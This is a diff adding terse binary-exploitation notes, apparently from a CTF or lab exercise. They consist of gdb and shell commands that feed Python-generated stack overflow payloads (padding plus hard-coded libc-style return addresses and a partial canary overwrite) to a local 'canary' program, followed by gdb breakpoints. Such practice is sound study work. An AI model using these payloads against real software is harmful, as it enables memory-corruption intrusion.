@@ -1,0 +1,18 @@
+r $(python -c 'print "A"*47+"\x80\x2e\xe3\xf7"+"\x91\x2d\xf2\xf7"*2') $(python -c 'print "B"*62+"\x34\x23"')
+
+Avec printf :
+r $(python -c 'print "A"*47+"\xe0\x19\xe4\xf7"') $(python -c 'print "B"*62+"\x34\x23"')
+
+./canary $(python -c 'print "\x10"*47+"\x20\x9b\xe5\xf7"') $(python -c 'print "B"*62+"\xd6\x0a"')
+
+./exploit | sed '/Bad/,/Stack/d' | hexdump
+
+
+
+set follow-fork-mode child
+b main
+r
+continue
+b *0x0804897f
+b *0x08048997
+continue
